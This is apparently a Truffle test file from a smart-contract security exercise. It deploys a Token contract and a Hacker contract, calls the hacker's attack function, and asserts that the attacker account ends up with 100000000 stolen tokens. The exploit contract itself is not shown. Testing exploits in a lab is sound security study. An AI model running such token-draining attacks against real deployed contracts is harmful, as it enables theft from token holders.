const Token = artifacts.require("Token");
const Hacker = artifacts.require("Hacker");
const { BN } = require("@openzeppelin/test-helpers");
const { expect } = require("chai");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should steal countless of tokens", async function () {
    const targetContract = await Token.deployed();
    const hackerContract = await Hacker.deployed();
    const result = await hackerContract.attack(targetContract.address, 100000000, { from: _hacker });
    expect(result.receipt.status).to.equal(true);
    const hackerBalance = await targetContract.balanceOf(_hacker);
    expect(hackerBalance).to.be.bignumber.equal(new BN(100000000));
  });
});
